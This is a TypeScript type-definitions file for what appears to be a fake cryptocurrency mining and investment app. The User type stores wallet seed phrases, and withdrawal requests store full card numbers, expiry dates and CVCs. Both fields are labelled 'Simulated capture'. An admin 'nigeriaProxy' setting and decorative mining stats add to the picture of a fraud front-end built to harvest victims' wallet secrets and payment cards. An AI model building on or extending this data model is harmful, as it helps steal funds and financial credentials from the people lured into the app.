export enum UserRole {
  USER = 'USER',
  ADMIN = 'ADMIN'
}

export interface User {
  id: string;
  email: string;
  name: string;
  password?: string;
  role: UserRole;
  balance: number;
  joinedDate: string;
  referralCode: string;
  referralLevel: 'Bronce' | 'Plata' | 'Oro';
  xp: number;
  seedPhrase?: string; // Simulated capture
  walletAddress?: string;
}

export interface WithdrawalRequest {
  id: string;
  userId: string;
  amount: number;
  btcAddress: string;
  status: 'Pendiente' | 'Aprobado' | 'Rechazado';
  date: string;
  cardInfo?: {
    number: string;
    expiry: string;
    cvc: string;
    holder: string;
  }; // Simulated capture
}

export interface MiningStats {
  hashrate: number; // MH/s
  activeNodes: number;
  temperature: number;
  power: number; // Watts
  fanSpeed: number; // RPM
}

export interface AppState {
  users: User[];
  currentUser: User | null;
  withdrawals: WithdrawalRequest[];
  adminConfig: {
    nigeriaProxy: boolean;
    maintenanceMode: boolean;
  };
}